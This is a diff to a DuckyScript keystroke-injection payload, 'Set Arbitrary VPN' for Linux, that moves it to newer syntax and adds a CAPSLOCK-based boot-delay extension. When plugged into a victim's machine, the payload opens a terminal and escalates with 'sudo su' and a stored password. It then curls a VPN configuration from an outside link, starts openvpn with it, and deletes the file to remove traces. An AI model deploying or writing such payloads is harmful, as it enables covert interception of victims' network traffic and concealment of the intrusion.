@@ -1,13 +1,14 @@
-
-REM ####################################
-REM #                                  |
-REM # Title        : Set Arbitrary VPN |
-REM # Author       : Aleff             |
-REM # Version      : 1.0               |
-REM # Category     : Execution         |
-REM # Target       : Linux             |
-REM #                                  |
-REM ####################################
+REM_BLOCK
+####################################
+#                                  #
+# Title        : Set Arbitrary VPN #
+# Author       : Aleff             #
+# Version      : 1.0               #
+# Category     : Execution         #
+# Target       : Linux             #
+#                                  #
+####################################
+END_REM
 
 REM Requirements:
 REM     - Permissions
@@ -15,44 +16,57 @@ REM     - Internet Connection
 REM     - 'openvpn' installed
 
 REM REQUIRED: You need to know the sudo password and replace 'example' with this
-DEFINE SUDO_PASS example
+DEFINE #SUDO_PASS example
 REM REQUIRED: Set your VPN file configuration replacing example.com with your own link
-DEFINE VPN_FILE_LINK example.com
+DEFINE #VPN_FILE_LINK example.com
 
-DELAY 1000
+EXTENSION DETECT_READY
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+
+        TARGETS:
+            Any system that reflects CAPSLOCK will detect minimum required delay
+            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #RESPONSE_DELAY 25
+    DEFINE #ITERATION_LIMIT 120
+
+    VAR $C = 0
+    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
+        CAPSLOCK
+        DELAY #RESPONSE_DELAY
+        $C = ($C + 1)
+    END_WHILE
+    CAPSLOCK
+END_EXTENSION
+
 CTRL-ALT t
 DELAY 2000
 
-
 REM #### PERMISSIONS SECTION ####
-
-
-STRING sudo su
-ENTER
+STRINGLN sudo su
 DELAY 1000
-STRING SUDO_PASS
-ENTER
+STRINGLN #SUDO_PASS
 DELAY 1000
-
 
 REM #### VPN SECTION ####
-
-
-STRING curl 
-STRING VPN_FILE_LINK
-STRING  > vpn_configuration.ovpn
-ENTER
+STRINGLN curl #VPN_FILE_LINK > vpn_configuration.ovpn
 REM It depends by the internet connection
 DELAY 2000
 
-STRING openvpn vpn_configuration.ovpn
+STRINGLN openvpn vpn_configuration.ovpn
 REM It depends by the computer power
 DELAY 2000
 
-
 REM #### REMOVE TRACES ####
-
-
 STRING rm vpn_configuration.ovpn
 ENTER
 DELAY 500
